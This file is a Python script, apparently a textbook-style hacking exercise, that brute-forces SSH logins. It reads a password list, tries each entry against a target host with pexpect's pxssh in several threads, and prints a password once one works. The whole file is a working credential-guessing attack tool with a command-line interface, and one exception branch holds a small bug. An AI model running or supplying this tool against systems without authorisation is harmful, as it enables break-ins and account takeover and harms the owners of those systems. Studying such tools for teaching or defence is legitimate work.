import pexpect.pxssh as pxssh
import optparse
import time

from threading import *

max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password Found" + password)
        Found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(s):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser("Usage%prog " + \
                                   "-H <target host> -u <user> -F <password file>")
    parser.add_option("-H", dest="tgt_host", type="string", help="specify target host")
    parser.add_option("-F", dest="password_file", type="string", help="specify password file")
    parser.add_option("-u", dest="user", type="string", help="specify the user")
    (options, _) = parser.parse_args()
    host = options.tgt_host
    passwd_file = options.password_file
    user = options.user
    if host is None or passwd_file is None or user is None:
        print(parser.usage)
        exit(0)

    fn = open(passwd_file, 'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()
